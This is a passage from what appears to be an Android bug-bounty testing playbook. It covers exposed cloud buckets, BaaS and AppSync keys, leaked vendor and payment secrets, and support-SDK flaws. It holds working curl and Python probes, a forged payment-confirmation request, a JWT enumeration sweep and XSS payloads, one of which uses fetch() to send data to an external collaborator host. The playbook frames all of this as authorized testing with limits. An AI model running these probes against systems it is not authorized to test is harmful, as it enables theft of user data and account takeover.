grep -rhoE '[a-z0-9.-]+\.s3[.-][a-z0-9-]*\.amazonaws\.com|s3://[a-z0-9.-]+|storage\.googleapis\.com/[a-z0-9._-]+|[a-z0-9]+\.blob\.core\.windows\.net|[a-z0-9-]+\.oss-[a-z0-9-]+\.aliyuncs\.com' \
  "$DEC" | sort -u > buckets.txt ; wc -l buckets.txt
curl -s "https://<bucket>.s3.amazonaws.com/?list-type=2&max-keys=20" | head -c 800
aws s3 ls "s3://<bucket>" --no-sign-request
aws s3api get-bucket-acl --bucket <bucket> --no-sign-request 2>&1 | head
curl -s "https://storage.googleapis.com/<bucket>?maxResults=20" | head -c 800
curl -s "https://storage.googleapis.com/storage/v1/b/<bucket>/o?maxResults=20" | jq -r '.items[]?.name' | head
```
- **Proof:** A `ListBucketResult` / JSON listing with real object keys, or a 200 on a specific private object path. Record the object-key structure — it often reveals a predictable per-user path. State the object count; do not download the bucket.
- **Escalation:** -> D18-040 write, -> D18-043 key-structure IDOR, -> D20 mass PII. Precedents: H1 #1021906 ($2,900), #361438.
- **Ruled out when:** Every host in `buckets.txt` returns `AccessDenied`/403 for listing **and** a direct object fetch of a path recovered from the app's source also fails, both anonymously and with any credentials recovered in D18-035/-036. Count the hosts probed against `wc -l buckets.txt` — if the numbers differ, the sweep ate entries (D18-070).

### D18-040 · Anonymous write to an app-referenced bucket

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for targeted overwrite |
| **Attacker** | AM-01 |
| **Applies to** | All |
| **Requires** | — |
| **Maps to** | API8:2023; the corpus's rating rule from H1 #351555 — "those keys give me ability to not only access the files, but also replace and delete them" |

- **Test:** World-writable beats world-readable by a band. Test a **benign** `PutObject` into a scratch key, read it back, delete it.
- **How:**
```bash
M=hq82rv5t
printf '%s' "$M" | aws s3 cp - "s3://<bucket>/pt_$M.txt" --no-sign-request   # never /dev/null: the CLI skips special files with a warning and exit 0, so the ls that follows reports a writable bucket as not writable
aws s3 ls "s3://<bucket>/pt_$M.txt" --no-sign-request
aws s3 rm "s3://<bucket>/pt_$M.txt" --no-sign-request
# or plain HTTP
curl -s -i -X PUT --data "$M" "https://<bucket>.s3.amazonaws.com/pt_$M.txt" | head -1
curl -s "https://<bucket>.s3.amazonaws.com/pt_$M.txt"
curl -s -i -X DELETE "https://<bucket>.s3.amazonaws.com/pt_$M.txt" | head -1
```
- **Proof:** The written marker returned by an independent `GET`, then the delete confirmation and a final empty read. A `200` on the `PUT` alone is not proof (D18-071). Say in the report that you wrote one 8-byte marker object to a scratch key and removed it.
- **Escalation:** A writable bucket the app loads content, config or code from is content injection into every install -> D10 / -> D17 / -> D02; a writable bucket on a trusted origin is a stored-XSS primitive -> D15 CORS/subdomain chain.
- **Ruled out when:** `PutObject` returns `AccessDenied` at the bucket root, at any per-user prefix pattern from the source, and with every credential set recovered in this chapter. Record the prefix list you tried.

### D18-041 · Guessable bucket names derived from the app and organisation, with ownership triage

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies) |
| **Attacker** | AM-01 |
| **Applies to** | Apps serving assets from cloud storage |
| **Requires** | — |
| **Maps to** | H1 #1021906 ($2,900), #361438 |

- **Test:** Bucket names are a single global namespace, so `<org>-assets`, `<app>-prod`, `<brand>-static` exist for *someone*. Generate permutations from the package's own vocabulary, then triage ownership before writing anything up.
- **How:**
```bash
# vocabulary from the package itself, not from imagination
{ grep -oE 'package="[^"]+"' $MF | cut -d'"' -f2 | tr '.' '\n'
  grep -rhoE '[a-z0-9-]{4,}\.(com|net|io|co\.uk)' $R $A | cut -d. -f1
} | sort -u > words.txt
python3 - <<'PY'
import itertools, urllib.request
words = [w.strip() for w in open('words.txt') if 3 < len(w.strip()) < 24]
sufs  = ['assets','prod','static','media','uploads','backup','dev','staging','public','cdn','images','data']
cands = sorted({f"{w}-{s}" for w in words for s in sufs} | set(words))
hit = 0
for b in cands:
    try:
        with urllib.request.urlopen(f"https://{b}.s3.amazonaws.com/?list-type=2&max-keys=5", timeout=8) as r:
            print(f"{r.status} {b}"); hit += 1
    except urllib.error.HTTPError as e:
        if e.code not in (403, 404): print(f"{e.code} {b}")
    except Exception:
        pass
print(f"probed={len(cands)} listable={hit}")
PY
```
- **Proof:** Anonymous listing or download of **target-identifiable** content. Correlate the bucket with a confirmed target subdomain and verify the content actually references the target — generic or other-language content means a namespace collision belonging to an unrelated party, not a finding.
- **Escalation:** -> D18-040 write; -> D01 ownership triage for the scope question.
- **Ruled out when:** No permutation lists, or every one that lists contains content that does not reference the target (record one object name as evidence of the collision). Report the probe count and the hit count.

### D18-042 · Bucket takeover: the app still fetches a name nobody owns

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies); rate at the content-injection impact |
| **Attacker** | AM-01 |
| **Applies to** | Apps that fetch content from a bucket or CDN host named in the package |
| **Requires** | — |
| **Maps to** | The corpus's BackBlaze Android bucket-takeover write-up (indexed in iamsarvagyaa/AndroidSecNotes) |

- **Test:** If a bucket the app still requests has been deleted, the name is claimable in the global namespace and whoever claims it serves content to every install.
- **How:**
```bash
for b in $(sed -E 's#^s3://##; s#\.s3[.-].*##' buckets.txt | sort -u); do
  code=$(curl -s -o /dev/null -w '%{http_code}' "https://$b.s3.amazonaws.com/")
  body=$(curl -s "https://$b.s3.amazonaws.com/" | grep -oE '<Code>[A-Za-z]+</Code>' | head -1)
  echo "$code $body $b"
done
```
  `NoSuchBucket` for a host the app still requests is the takeover candidate. Confirm the app requests it by finding the fetch in the proxy, not only in the strings.
- **Proof:** The `NoSuchBucket` response, the proxy entry showing the app requesting that host at runtime, and the region/name registration check. **Do not claim the bucket** unless the program explicitly authorises it; describe the claimability and stop.
- **Escalation:** Claiming the name is content injection into every install -> D02 (if it serves update artefacts), -> D10 (WebView content), -> D17 (loaded code).
- **Ruled out when:** Every referenced bucket resolves and returns `AccessDenied` rather than `NoSuchBucket`, or the reference is dead code that the app never requests at runtime (prove that from a proxy capture across a full feature sweep, not from absence in a short session).

### D18-043 · Object-key structure in a listing as an IDOR primitive

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) for iterable keys; `…modify_view_sensitive_information_guid` (P4) when the key is a GUID and you cannot enumerate |
| **Attacker** | AM-01 or AM-05 |
| **Applies to** | Any storage surface whose listing succeeded, and any app that constructs object URLs client-side |
| **Requires** | two-accounts |
| **Maps to** | API1:2023; MASWE-0004 |

- **Test:** The listing is not the end of the finding — the *shape* of the keys is. `users/1041/passport.jpg` is an enumerable cross-user read even if the listing is later closed; `private/<identityId>/…` tells you exactly what to substitute. Also check whether the app builds the object URL on the client, which means the server never authorises the fetch.
- **How:**
```bash
# extract the key structure from the listing
curl -s "https://<bucket>.s3.amazonaws.com/?list-type=2&max-keys=1000" \
  | grep -oE '<Key>[^<]+</Key>' | sed 's/<\/\?Key>//g' \
  | awk -F/ '{ for(i=1;i<NF;i++) printf "%s/", ($i ~ /^[0-9]+$/ ? "<N>" : ($i ~ /^[0-9a-f-]{36}$/ ? "<GUID>" : $i)); print $NF }' \
  | sed -E 's/[^/]+$/<FILE>/' | sort | uniq -c | sort -rn | head -20
# does the app build the URL itself?
grep -rnE 'https?://[^"]*(s3|storage\.googleapis|blob\.core\.windows)[^"]*"|getUrl\(|buildUpon\(\)' $S/ | head -20
```
  Then, with two accounts you control, fetch account B's object path while holding account A's session.
- **Proof:** Account B's object retrieved with account A's identity — your own uid/identity id visible in the evidence beside the victim path. State whether the path was iterable (P1 band) or GUID-keyed (P4 band); the distinction changes the VRT node.
- **Escalation:** -> D15 for the same IDOR against the app's own API; -> D20 for the data class.
- **Ruled out when:** Object keys are unguessable (GUID or a keyed hash), the listing is closed, and a cross-account fetch with a substituted path returns 403. All three, not one.

### D18-044 · Non-Google BaaS: anon/publishable key and row-level security (Supabase, Appwrite, PocketBase)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Apps built on Supabase, Appwrite, PocketBase, Parse Server / Back4App, Hasura, MongoDB Atlas App Services / Data API, or any PostgREST- or GraphQL-style BaaS |
| **Requires** | backend-api |
| **Maps to** | API1:2023 (object-level authorisation delegated to policies that do not check ownership); API8:2023 |

- **Test:** These platforms ship a public `anon`/publishable key in the client and rely entirely on row-level security. If RLS is off, or a policy is `USING (true)`, the anon key is a full database client — and it is in every install.
- **How:**
```bash
grep -rnE 'supabase\.co|supabase\.in|appwrite|pocketbase|anon[_-]?key|publishable|service_role|X-Parse-Application-Id|X-Parse-REST-API-Key|X-Parse-Master-Key|parseapi\.|back4app|hasura|x-hasura-admin-secret|data\.mongodb-api\.com|realm-mongodb|AppConfiguration' \
  $R/values/strings.xml $S $A | sort -u
ANON=<anon key>; REF=<project ref>
# enumerate the exposed schema from the generated OpenAPI document
curl -s "https://$REF.supabase.co/rest/v1/" -H "apikey: $ANON" | jq -r '.definitions | keys[]'
# then read a table that should be user-scoped
curl -s "https://$REF.supabase.co/rest/v1/users?select=*&limit=5" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" | head -c 600
# write probe into a scratch row, then delete it
curl -s -i -X POST "https://$REF.supabase.co/rest/v1/<table>" \
  -H "apikey: $ANON" -H "Authorization: Bearer $ANON" -H 'Content-Type: application/json' \
  -d '{"note":"wq61bk3n"}' | head -3
# Parse: open class-level permissions on _User with the REST key = P1; a MASTER key in the APK = full compromise, file as its own primitive
curl -s "https://<parse-host>/classes/_User?limit=3" -H "X-Parse-Application-Id: <appid>" -H "X-Parse-REST-API-Key: <restkey>" | head -c 400
curl -s "https://<parse-host>/schemas" -H "X-Parse-Application-Id: <appid>" -H "X-Parse-Master-Key: <candidate>" | jq -r '.results[]?.className // .error'
# Hasura: the admin secret bypasses every permission rule
curl -s "https://<host>/v1/graphql" -H "x-hasura-admin-secret: <candidate>" -H 'Content-Type: application/json' -d '{"query":"{ __schema { types { name } } }"}' | head -c 300
# Atlas Data API / App Services: an apiKey or anonymous-auth app id reaches collections through the rules only
curl -s -X POST "https://<region>.data.mongodb-api.com/app/<appid>/endpoint/data/v1/action/find" -H "apiKey: <candidate>" -H 'Content-Type: application/json' -d '{"dataSource":"<cluster>","database":"<db>","collection":"users","limit":3}' | head -c 400
```
- **Proof:** Rows returned for a user-scoped table using only the key from the APK, plus the OpenAPI listing enumerating the schema. The schema listing alone is a useful secondary artefact but is not the finding.
- **Escalation:** Grep specifically for a `service_role` key — it bypasses RLS entirely and is a full database compromise (P1, file it as its own primitive).
- **Ruled out when:** Every table in the OpenAPI listing returns an empty array or a `permission denied for table` error with the anon key, **and** the same is true after signing up through the app and retrying with the user token (the `authenticated`-role equivalent of D18-019). No `service_role` key anywhere in the package. No master/admin-secret-shaped string in the package either (the Parse / Hasura regex above is empty).

### D18-045 · AWS AppSync / managed GraphQL with API-key authorisation mode

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1); `cloud_security.misconfigured_services_and_apis.insecure_api_endpoints` (P4) for the endpoint alone |
| **Attacker** | AM-01 |
| **Applies to** | Amplify/AppSync apps and any managed GraphQL endpoint whose key ships in the client |
| **Requires** | backend-api |
| **Maps to** | API1:2023, API5:2023, API8:2023 |

- **Test:** An AppSync endpoint with `API_KEY` as its authorisation mode accepts any caller holding the key in the APK. The resolvers, not the transport, are the only access control — and a `list*` query with no owner filter returns the whole table.
- **How:**
```bash
grep -rnoE '[a-z0-9-]+\.appsync-api\.[a-z0-9-]+\.amazonaws\.com/graphql|da2-[a-z0-9]{26}' \
  $R $A $S | sort -u
EP=https://<id>.appsync-api.<region>.amazonaws.com/graphql
KEY=da2-...
curl -s "$EP" -H "x-api-key: $KEY" -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } types { name fields { name } } } }"}' | head -c 800
curl -s "$EP" -H "x-api-key: $KEY" -H 'Content-Type: application/json' \
  -d '{"query":"{ listUsers(limit:5){ items { id email } } }"}' | head -c 600
```
- **Proof:** Records returned for a query that should be owner-scoped, with only the key from the package. Introspection alone is on the never-submit list — the finding is the data the query returns.
- **Escalation:** -> D15 GraphQL testing (field-level authorisation, mutation reach, depth). The endpoint and key belong in the identity table for D15 to consume.
- **Ruled out when:** The endpoint rejects the key (`UnauthorizedException`), introspection is disabled **and** every `list*`/`get*` query with the key returns an authorisation error, or the auth mode is Cognito/IAM and the key is absent. Record the query set you tried.

### D18-046 · Vendor SDK keys: separate the ingest key from the management/read key

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the key reads the vendor's copy of the user base; `…intentionally_public_sample_or_invalid` (P5) for an ingest-only key |
| **Attacker** | AM-01 |
| **Applies to** | All apps with analytics, crash, attribution, feature-flag or search SDKs |
| **Requires** | — |
| **Maps to** | API8:2023, API10:2023; H1 #41856 (Crashlytics/fabric.io rendering app-supplied content, as evidence that third-party pipelines process what the app sends) |

- **Test:** Most of these SDKs ship two credentials: a write-only ingest key that belongs in the client, and a management/export key that does not. Teams paste the wrong one. The distinguishing test is not the key's shape — it is whether the vendor's **read** API accepts it.
- **How:**
```bash
# harvest candidates and the vendor host set
# reuse apkleaks.json from D18-004 — do not run apkleaks again (15–20 min for the same output)
grep -rniE 'amplitude|mixpanel|segment|braze|clevertap|moengage|leanplum|appsflyer|adjust|branch|sentry|bugsnag|datadog|instabug|launchdarkly|optimizely|algolia' \
  $S/ | cut -d: -f1 | sort -u
# for each key, test the vendor's READ endpoint, never its ingest endpoint
curl -s -H "Authorization: Bearer $K" 'https://api.<vendor>.com/v1/projects'        | head -c 400
curl -s -H "X-API-Key: $K"            'https://api.<vendor>.com/v1/export/events'   | head -c 400
curl -s -u "$K:" 'https://api.<vendor>.com/v1/account'                              | head -c 400
```
  Cross-reference the proxy: the key the SDK sends on its ingest requests is the public one; a key present in the package but **never sent** by the app is the suspicious one.
- **Proof:** A read/export API returning project, user or event data with a key extracted from the APK. Export APIs typically contain device ids, IPs and user ids — a complete shadow copy of the user base held outside the client's control.
- **Escalation:** -> D20 mass PII; the vendor's console becomes a secondary data store, so ask about its access control in the report.
- **Ruled out when:** Every key is accepted only by the vendor's ingest endpoint and rejected by its management/export endpoints (record the vendor's 401/403 body for each), and no key exists in the package that the app never transmits. Name the endpoints tried.

### D18-047 · Payment-processor secret key in the package

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Apps taking card/wallet payments outside Play Billing (Stripe, Braintree, Adyen, Razorpay, PayU, Checkout.com) |
| **Requires** | payments |
| **Maps to** | CWE-798; the Datafarm Flutter case (secret key found in `createPaymentIntent()` in the Dart assembly output; the validated account held customer payment-card details, names, addresses, phone numbers and **$3,112 in pending charges**) |

- **Test:** PSPs give the client a *publishable* key and keep the *secret* key server-side. The finding is a secret/private key in the package. Validate with a read-only call and stop.
- **How:**
```bash
grep -rnE 'sk_(live|test)_[A-Za-z0-9]{16,}|rk_live_[A-Za-z0-9]{16,}|rzp_(live|test)_[A-Za-z0-9]{14}|key_secret|BraintreeClientToken|private_key|ADYEN_.*KEY|checkout_secret' \
  $S $R $A
# cross-platform: the key is in the Dart/Hermes/IL2CPP layer, not the dex
grep -aoE 'sk_live_[0-9a-zA-Z]{20,}' libapp.strings $A/index.android.bundle 2>/dev/null | sort -u
# validate read-only — NEVER create a charge or a refund
curl -s https://api.stripe.com/v1/balance -u "$SK:" | head -c 400
curl -s https://api.razorpay.com/v1/payments?count=1 -u "$KEY_ID:$KEY_SECRET" | head -c 200
```
- **Proof:** A 200 from a read-only endpoint (`GET /v1/balance` is sufficient) showing the account is live and production-scoped. **Do not** issue charges, refunds, transfers or customer reads beyond the minimum needed to prove the key authenticates.
- **Escalation:** A PSP secret key also reads the customer object, which is a bulk-PII finding in its own right — state that as impact, do not demonstrate it. -> D23 financial fraud.
- **Ruled out when:** Only `pk_live_`/`pk_test_` publishable keys or a Braintree *client* token are present, and every candidate secret-shaped string fails authentication. Publishable keys are P5 by design — put them in the graveyard row with the vendor's documentation reference.

### D18-048 · Client-asserted payment success: the SDK callback treated as authoritative

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.privilege_escalation` (varies) — rate on the value obtained; the money movement is the impact statement |
| **Attacker** | AM-05 (a user of the app) |
| **Applies to** | Apps whose order state transitions on a PSP SDK callback rather than on a server-verified webhook |
| **Requires** | payments, backend-api, mitm |
| **Maps to** | API10:2023 Unsafe Consumption of APIs |

- **Test:** The PSP SDK's local "payment succeeded" callback is client state. If the backend marks the order paid on the client's say-so rather than waiting for the PSP's server-to-server confirmation, the order completes without a charge.
- **How:**
```bash
grep -rnE 'onPaymentSuccess|onActivityResult.*payment|confirmPayment|handleNextAction|PaymentIntentResult|setPaid|markOrderPaid|paymentStatus' $S/
# replay the confirmation the client sends, with a payment reference that does not exist
curl -s -i -X POST https://api.target/v1/orders/$ORDER/confirm \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"payment_intent":"pi_does_not_exist","status":"succeeded"}' | head -20
```
- **Proof:** The five-screenshot state-change pattern: (1) pre-state — the order shown unpaid; (2) the bug — the forged confirmation accepted; (3) negative post-state — the PSP dashboard showing no matching charge; (4) positive post-state — the order shown paid/fulfilled in the app; (5) side effect — the confirmation email or notification. Take them in one sitting without reloading between captures.
- **Escalation:** -> D23 payments and entitlement fraud. If the same endpoint accepts another user's order id, it is additionally an IDOR -> D15.
- **Ruled out when:** The forged confirmation is rejected, **and** the order state only advances after the PSP's webhook fires — show the order still unpaid after your forged call and paid only after a genuine test payment. A rejection alone could be input validation in front of the real check (D18-069).

### D18-049 · Media and CDN vendor credentials (Cloudinary, Backblaze B2, image/video pipelines)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the credential permits write/delete of user content; `…pay_per_use_abuse` (P4) for metered read only |
| **Attacker** | AM-01 |
| **Applies to** | Apps using a hosted media pipeline |
| **Requires** | — |
| **Maps to** | H1 #351555 (Reverb, Cloudinary api secret, Medium — the SDK's own README says "the api secret and key should be left out of the application"), #412772 (8x8, High, $500), #753868 (Zenly, Medium, $750), #440629 (Starbucks), #1641475 (GlassWire), #792850 (NordVPN) |

- **Test:** These SDKs' quick-start guides tell developers to paste the full credential URL into the client, so the finding is common. Rate it on whether the credential permits **write/delete**, not just read — #351555's argument was exactly that.
- **How:**
```bash
grep -rnoE 'cloudinary://[0-9]+:[A-Za-z0-9_-]+@[a-z0-9-]+|B2_APPLICATION_KEY|b2_[a-z0-9]{25,}|CLOUDINARY_URL' "$DEC" | sort -u
# validate with a usage/account endpoint — counters, not content
curl -s "https://api.cloudinary.com/v1_1/<cloud>/usage" -u "<key>:<secret>" | jq .
# confirm the scope without enumerating assets
curl -s "https://api.cloudinary.com/v1_1/<cloud>/resources/image?max_results=1" -u "<key>:<secret>" | jq '{total_count}'
```
- **Proof:** The usage endpoint returning real counters — #351555's evidence was exactly that (`"requests":1894689201,"resources":36029794`), which proves the credential is live and production-scoped without downloading anyone's media. Then state, without demonstrating, that the same credential permits replace and delete per the vendor's API documentation.
- **Escalation:** Write access to a media pipeline the app renders from is content injection -> D10; if it serves app update artefacts -> D02.
- **Ruled out when:** Only an unsigned-upload preset or a delivery-only URL prefix is present (both are public by design), and every credential-shaped string fails the vendor's account endpoint. Record the vendor error.

### D18-050 · Search-vendor admin key shipped where the search key belongs (Algolia class)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Apps with a hosted search SDK |
| **Requires** | — |
| **Maps to** | CWE-798; API8:2023; the cross-platform corpus's explicit list of bundle-shipped keys that are "public" in name only — "Firebase server keys, Algolia admin keys, Stripe secret keys, map/billing keys with no referrer restriction" |

- **Test:** Hosted search platforms issue a search-only key for the client and an admin key for the backend. They look identical. The admin key lists every index, reads every record and can delete indices.
- **How:**
```bash
grep -rniE 'algolia|application_id|search.?only.?key|admin.?api.?key|X-Algolia-API-Key|X-Algolia-Application-Id' \
  $R/values/strings.xml $S $A | sort -u
APPID=<app id>; K=<key>
# an admin key can list indices; a search-only key cannot
curl -s "https://$APPID.algolia.net/1/indexes" \
  -H "X-Algolia-API-Key: $K" -H "X-Algolia-Application-Id: $APPID" | jq -r '.items[]?.name // .message'
# and can read its own ACL
curl -s "https://$APPID.algolia.net/1/keys/$K" \
  -H "X-Algolia-API-Key: $K" -H "X-Algolia-Application-Id: $APPID" | jq '{acl, indexes, validity}'
```
- **Proof:** The index listing, plus the key's own ACL showing `addObject`/`deleteIndex`/`settings` rather than `search` alone. The ACL response is the cleanest single artefact because it is the vendor stating the key's privilege.
- **Escalation:** Indices frequently hold the full user or catalogue table -> D20; write ACL means poisoning what every user searches -> D10 if results render as HTML.
- **Ruled out when:** The key's own ACL returns `["search"]` only and the index listing is refused. Paste the ACL.

### D18-051 · Identity-verification vendor SDK token: scope, lifetime and applicant binding

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_guid` (P4) for the token-mint IDOR; rate up to `…modify_view_sensitive_information_iterable_object_identifiers` (P1) if applicant ids are iterable and the capture binds |
| **Attacker** | AM-05 |
| **Applies to** | Apps with third-party identity verification (Onfido, Sumsub, Veriff, Jumio, Persona and similar) |
| **Requires** | two-accounts, mitm |
| **Maps to** | No external identifier verified in the corpus for this class; rate on demonstrated impact |

- **Test:** These SDKs initialise with a short-lived, applicant-scoped token that the backend must mint. Test three things: is the token long-lived, is it scoped to *your* applicant, and does swapping an applicant/inquiry id in the mint call bind your capture session to someone else's identity record.
- **How:**
```bash
grep -rniE 'sdkToken|applicantId|inquiryId|workflowRunId|onfido|sumsub|veriff|jumio|persona|withToken|init\(.*token' $S/
# capture the mint call in the proxy, then substitute the identifier
curl -s -i -X POST https://api.target/v1/kyc/sdk-token \
  -H "Authorization: Bearer $ATTACKER_TOKEN" -H 'Content-Type: application/json' \
  -d '{"applicant_id":"<VICTIM_APPLICANT>"}' | head -20
# decode the token's claims and expiry
echo "$SDKTOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq
```
- **Proof:** A token minted for another user's applicant id, with the decoded claims showing the victim's applicant — or a token with a multi-day expiry that still initialises the SDK after the session that minted it was revoked. Use two accounts you control.
- **Escalation:** Binds an attacker-controlled document capture to a victim's identity record -> D15 KYC overwrite; a long-lived third-party identity credential in traffic is separately reportable.
- **Ruled out when:** The mint endpoint rejects an applicant id that is not the caller's (403, with both account ids shown), and the decoded token expiry is minutes rather than days. Both halves.

### D18-052 · Support/chat SDK identity verification disabled, or the HMAC computed on-device

| | |
|---|---|
| **Severity ceiling** | High (Critical where the support thread is also a recovery channel) |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) where user ids are iterable; `broken_authentication_and_session_management.authentication_bypass` (P1) where identity verification was the only control |
| **Attacker** | AM-01 (with the extracted secret) or AM-05 |
| **Applies to** | Apps embedding Intercom, Zendesk Messaging, Freshchat, Helpshift or Salesforce Embedded Messaging |
| **Requires** | mitm |
| **Maps to** | `developers.intercom.com/installing-intercom/android/identity-verification` — `Intercom.client().setUserHash(...)`, HMAC-SHA256 over the user id or email, the secret must live "in a secure place on your app server", and the API Auth Server returns **401** when the HMAC fails |

- **Test:** Support SDKs authenticate the end user with an HMAC or JWT that the vendor requires to be produced **server-side**. If identity verification is off, or the secret ships in the APK so the client can compute it, any user can register as any other user and read their entire support history — which routinely contains order numbers, addresses, partial card data and account-recovery correspondence.
- **How:**
```bash
grep -rnE 'setUserHash|Intercom\.client\(\)|registerIdentifiedUser|registerUnidentifiedUser|Zendesk.*loginUser|jwtToken|authenticationToken|Freshchat.*restoreId|identity_verification' \
  $S/
grep -rnE '[A-Za-z0-9_+/=-]{32,}' $R/values/strings.xml | grep -iE 'intercom|zendesk|freshchat|helpshift'
# is the hash produced locally?  hook the setter and change the user id
```
```javascript
Java.perform(function () {
  var I = Java.use('io.intercom.android.sdk.Intercom');
  I.setUserHash.implementation = function (h) { console.log('[setUserHash] ' + h); return this.setUserHash(h); };
});
```
  If the app still produces a valid hash after you change the device's user id offline, the secret is local. Then, in the proxy, replay the registration with another user's id and no hash (or the locally computed one).
- **Proof:** The support SDK returning another user's conversation list or history after registration with that user's id — a screenshot of the loaded conversation plus the request showing the substituted id. With identity verification enabled and server-side, the vendor returns **401** instead; capture that as the control case.
- **Escalation:** -> D15 support-ticket IDOR; -> D13 if agents perform password resets from the thread, because the support desk becomes a social-engineering path to full account takeover.
- **Ruled out when:** `setUserHash`/`loginUser` is called with a value that only the backend can produce (you changed the user id and the app could not mint a matching hash), and replaying registration with a second user's id returns 401. Show the 401.

### D18-053 · Support/chat SDK minting predictable identity tokens from a hardcoded secret

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Apps embedding a support/chat SDK that mints identity tokens on-device |
| **Requires** | — |
| **Maps to** | Public reporting of a Zendesk Android SDK issue describing token generation that "combin[es] hardcoded secrets with sequential account IDs to create predictable JWT tokens", enumerable "without triggering rate limiting or account lockout". **The corpus read only secondary coverage and names no CVE — verify the current SDK behaviour yourself before asserting it, and do not cite a CVE.** |

- **Test:** Where the SDK mints its own identity token client-side from a shared secret plus a sequential id, the token space is enumerable. Extract the secret, derive tokens across an id range, and measure the response delta.
- **How:**
```bash
grep -rn 'Jwts\.builder\|SignatureAlgorithm\.HS256\|HmacSHA256\|io/jsonwebtoken\|setIdentity\|JwtIdentity' $S/
grep -rnE '"[A-Za-z0-9+/]{32,}={0,2}"' $S/<sdkpkg>/ | head     # candidate shared secrets
strings -a $R/values/strings.xml | grep -iE 'zendesk|intercom|app_id|key'
```
```python
# sweep in Python, with per-iteration logging and a final count — never a shell array loop
import subprocess, json
secret, lo, hi, hits = open('secret.txt').read().strip(), 1000, 1100, 0
for i in range(lo, hi):
    tok = mint_jwt(secret, i)                      # your minting helper
    out = subprocess.run(['curl','-s','-o','/dev/null','-w','%{http_code}:%{size_download}',
                          '-H', f'Authorization: Bearer {tok}',
                          'https://<sdk-endpoint>/api/v2/tickets.json'], capture_output=True, text=True).stdout
    code, size = out.split(':')
    print(i, code, size)
    if code == '200' and int(size) > 0: hits += 1
print(f"probed={hi-lo} nonempty200={hits}")
```
- **Proof:** A response-code/size delta table showing a band of ids returning 200 with non-empty bodies containing another user's or tenant's ticket content, and no rate limit or lockout across the sweep. Apply the statistical-sample discipline: at least ten interleaved probes per group before claiming the absence of throttling.
- **Escalation:** Support-desk access -> D13 account recovery; -> D20 for the PII in the threads.
- **Ruled out when:** No HMAC/JWT minting code exists in the SDK package (the token arrives from the app's own backend), or the candidate secrets produce tokens the vendor rejects with 401 across the whole sweep. Report the sweep count.

### D18-054 · Support/chat SDK WebView rendering agent- and bot-supplied HTML

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies); rate at what the reachable bridge returns |
| **Attacker** | AM-05 (the peer or agent side of the conversation) |
| **Applies to** | Apps with embedded support chat |
| **Requires** | webview, mitm |
| **Maps to** | H1 #401793 (Grab — a support activity's WebView with `addJavascriptInterface` exposing `getGrabUser()`, High 7.1: "JS interfaces have no origin policies, so if you have the ability to run your own JS in the given WebView, you can access them"); H1 #180349 (Zendesk Android SDK, unprotected `CREATE_REQUEST` broadcast) |

- **Test:** Support SDKs render conversation content in a `WebView` and many expose a bridge for actions and file previews. The content comes from the agent side, a bot template, or another user in a marketplace app. Test whether message bodies, quick replies, article previews or attachment previews execute script, and whether a bridge is reachable from that script.
- **How:**
```bash
grep -rniE 'zendesk|intercom|freshchat|helpshift|salesforce.*messaging' -l $S/ | head
grep -rnE 'addJavascriptInterface|setJavaScriptEnabled\(true\)|setAllowFileAccess|setAllowFileAccessFromFileURLs|setAllowUniversalAccessFromFileURLs|loadDataWithBaseURL' $S/ \
  | grep -iE 'zendesk|intercom|freshchat|helpshift|support|chat'
```
  From the agent console, or by replaying the peer's "send message" API, send:
  `<img src=x onerror="alert(Object.keys(window))">` to enumerate injected bridges, then
  `<img src=x onerror="fetch('https://<collab-id>.oastify.com/'+JSON.stringify(Object.keys(window)))">`.
- **Proof:** The payload executing in the chat WebView — screen-record the alert or capture the outbound fetch in the proxy — and `Object.keys(window)` listing an app-injected object name. Then call one bridge method and show what it returns.
- **Escalation:** Any reachable bridge method -> D10 `addJavascriptInterface` chain; a method returning the session user object is the Grab shape and is High on its own.
- **Ruled out when:** The chat WebView has `setJavaScriptEnabled(false)`, or JavaScript is on but `Object.keys(window)` lists no app-injected object **and** the WebView holds no app cookies for a first-party origin (check `CookieManager` for the loaded origin). Both conditions.

### D18-055 · Inter-environment key reuse: the staging key is the production key

| | |
|---|---|
| **Severity ceiling** | High |
